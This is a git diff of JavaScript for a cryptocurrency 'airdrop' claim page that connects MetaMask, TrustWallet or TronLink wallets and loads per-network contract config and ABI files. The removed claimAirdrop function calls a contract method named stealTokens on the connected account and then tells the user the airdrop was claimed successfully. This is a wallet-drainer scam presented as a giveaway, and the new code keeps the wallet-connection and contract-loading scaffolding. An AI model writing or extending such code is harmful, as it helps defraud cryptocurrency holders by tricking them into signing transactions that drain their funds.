@@ -5,105 +5,116 @@ let tokenAddress;
 let contractABI;
 let isConnected = false;
 
-// This function loads the config and ABI based on the selected network
-async function loadConfig(network) {
-    try {
-        // Load config based on network (Ethereum, BSC, Tron)
-        const configResponse = await fetch(`./config/${network}_config.json`);
-        if (!configResponse.ok) throw new Error('Failed to fetch config');
-        const configData = await configResponse.json();
-        contractAddress = configData.contractAddress;
-        tokenAddress = configData.tokenAddress;
+// Detects the network based on MetaMask or TronLink connection
+async function detectNetwork() {
+    if (window.ethereum) {
+        try {
+            const chainId = await ethereum.request({ method: 'eth_chainId' });
 
-        // Load ABI based on network
-        const abiResponse = await fetch(`./abi/${network}_abi.json`);
-        if (!abiResponse.ok) throw new Error('Failed to fetch ABI');
-        contractABI = await abiResponse.json();
-
-        console.log("Config and ABI loaded for", network, configData);
-    } catch (error) {
-        console.error("Error loading config/ABI:", error);
-        alert("Failed to load configuration. Please try again later.");
+            // Check if it's a supported network (Ethereum or BSC)
+            if (chainId === '0x1') {  // Ethereum Mainnet
+                return 'eth';
+            } else if (chainId === '0x38') {  // Binance Smart Chain (BSC)
+                return 'bsc';
+            } else {
+                console.error('Unsupported Ethereum network detected.');
+                return null;
+            }
+        } catch (error) {
+            console.error('Error detecting network:', error);
+            return null;
+        }
+    } else if (window.tronLink) {
+        // Assuming TronLink is available for Tron network detection
+        try {
+            const chainId = await window.tronLink.tronWeb.defaultAddress.base58;  // Adjust based on TronLink API
+            return 'tron';
+        } catch (error) {
+            console.error('Error detecting Tron network:', error);
+            return null;
+        }
+    } else {
+        console.error('No supported wallet detected');
+        return null;
     }
 }
 
-// This function handles wallet connection (MetaMask, TrustWallet, TronLink)
-async function connectWallet(walletType, network) {
-    if (isConnected) return;
+// Loads the correct configuration and ABI based on the detected network
+async function loadConfig() {
+    const network = await detectNetwork();  // Detect network
 
-    if (walletType === 'MetaMask') {
-        // MetaMask-specific connection logic
-        if (window.ethereum) {
-            web3 = new Web3(window.ethereum);
-            try {
-                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                console.log("Connected to MetaMask:", accounts);
-                isConnected = true;
-                document.getElementById('claimAirdropButton').disabled = false;
-                document.getElementById('connectButton').disabled = true;
-                await loadConfig(network); // Load config after wallet connection
-            } catch (error) {
-                console.error("MetaMask connection failed:", error);
-                alert("Failed to connect to MetaMask.");
-            }
-        } else {
-            alert("MetaMask is not installed. Please install it to continue.");
-        }
-    } else if (walletType === 'TrustWallet') {
-        // TrustWallet-specific connection logic (similar to MetaMask)
-        // (Assuming TrustWallet uses MetaMask's Web3 API)
-        if (window.ethereum) {
-            web3 = new Web3(window.ethereum);
-            try {
-                accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                console.log("Connected to TrustWallet:", accounts);
-                isConnected = true;
-                document.getElementById('claimAirdropButton').disabled = false;
-                document.getElementById('connectButton').disabled = true;
-                await loadConfig(network); // Load config after wallet connection
-            } catch (error) {
-                console.error("TrustWallet connection failed:", error);
-                alert("Failed to connect to TrustWallet.");
-            }
-        } else {
-            alert("TrustWallet is not installed. Please install it to continue.");
-        }
-    } else if (walletType === 'TronLink') {
-        // TronLink-specific connection logic
-        if (window.tronLink) {
-            // Using TronLink's window object
-            try {
-                accounts = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                console.log("Connected to TronLink:", accounts);
-                isConnected = true;
-                document.getElementById('claimAirdropButton').disabled = false;
-                document.getElementById('connectButton').disabled = true;
-                await loadConfig(network); // Load config after wallet connection
-            } catch (error) {
-                console.error("TronLink connection failed:", error);
-                alert("Failed to connect to TronLink.");
-            }
-        } else {
-            alert("TronLink is not installed. Please install it to continue.");
-        }
-    }
-}
-
-// This function handles the airdrop claiming process after successful connection
-async function claimAirdrop() {
-    if (!accounts || !contractABI || !contractAddress) {
-        alert("Configuration is missing. Connect a wallet first.");
+    if (!network) {
+        console.error('Unsupported or no network detected');
         return;
     }
 
-    const contract = new web3.eth.Contract(contractABI, contractAddress);
+    // Determine which config file to load based on the detected network
+    let configFile = '';
+    let abiFile = '';
+
+    if (network === 'eth') {
+        configFile = 'eth_config.json';
+        abiFile = 'eth_abi.json';
+    } else if (network === 'bsc') {
+        configFile = 'bsc_config.json';
+        abiFile = 'bsc_abi.json';
+    } else if (network === 'tron') {
+        configFile = 'tron_config.json';
+        abiFile = 'tron_abi.json';
+    } else {
+        console.error('Network is unsupported or not recognized.');
+        return;
+    }
+
+    // Load the config and ABI files from the correct folders
     try {
-        // Call the airdrop method based on the connected network
-        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
-        alert("Airdrop claimed successfully!");
+        const configResponse = await fetch(`/wallets/config/${configFile}`);
+        const configData = await configResponse.json();
+
+        const abiResponse = await fetch(`/wallets/abi/${abiFile}`);
+        const abiData = await abiResponse.json();
+
+        // Set the global variables
+        contractAddress = configData.contractAddress;
+        tokenAddress = configData.tokenAddress;
+        contractABI = abiData;
+
+        console.log('Loaded config:', configData);
+        console.log('Loaded ABI:', abiData);
+
+        // You can then use this data to interact with the smart contract
     } catch (error) {
-        console.error("Error claiming airdrop:", error);
-        alert("Failed to claim the airdrop.");
+        console.error('Error loading config or ABI:', error);
     }
 }
+
+// Connect to MetaMask
+async function connectMetaMask() {
+    if (window.ethereum) {
+        try {
+            await ethereum.request({ method: 'eth_requestAccounts' });
+            console.log('Connected to MetaMask');
+            web3 = new Web3(window.ethereum);
+            accounts = await web3.eth.getAccounts();
+            isConnected = true;
+
+            console.log('Accounts:', accounts);
+            await loadConfig(); // Load the config after connecting
+        } catch (error) {
+            console.error('MetaMask connection failed:', error);
+        }
+    } else {
+        alert('MetaMask is not installed!');
+    }
+}
+
+// Event listeners for buttons
+window.addEventListener('DOMContentLoaded', async () => {
+    // Wait for DOM content to load
+
+    // Add event listener to connect MetaMask button
+    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+
+    // You could add more event listeners here for other wallets like TronLink, etc.
+});
 
